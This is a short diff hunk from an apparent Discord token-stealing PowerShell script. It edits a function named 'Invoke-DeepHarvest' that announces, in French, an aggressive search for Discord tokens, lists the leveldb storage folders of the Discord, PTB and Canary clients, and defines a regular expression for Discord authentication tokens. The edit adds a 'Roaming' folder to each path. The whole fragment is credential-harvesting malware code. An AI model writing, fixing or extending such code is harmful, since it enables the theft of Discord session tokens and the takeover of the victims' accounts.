@@ -113,12 +113,12 @@ function Invoke-DeepHarvest {
     Write-Host "[+] Recherche agressive des tokens Discord..." -ForegroundColor Yellow
     
     $DiscordPaths = @(
-        "$env:APPDATA\Discord\Local Storage\leveldb",
-        "$env:APPDATA\discordptb\Local Storage\leveldb",
-        "$env:APPDATA\discordcanary\Local Storage\leveldb",
-        "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
-        "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb",
-        "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb"
+        "$env:APPDATA\Roaming\Discord\Local Storage\leveldb",
+        "$env:APPDATA\Roaming\discordptb\Local Storage\leveldb",
+        "$env:APPDATA\Roaming\discordcanary\Local Storage\leveldb",
+        "$env:LOCALAPPDATA\Roaming\Discord\Local Storage\leveldb",
+        "$env:LOCALAPPDATA\Roaming\discordptb\Local Storage\leveldb",
+        "$env:LOCALAPPDATA\Roaming\discordcanary\Local Storage\leveldb"
     )
     
     $TokenPattern = '[a-zA-Z0-9_-]{22,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,38}'
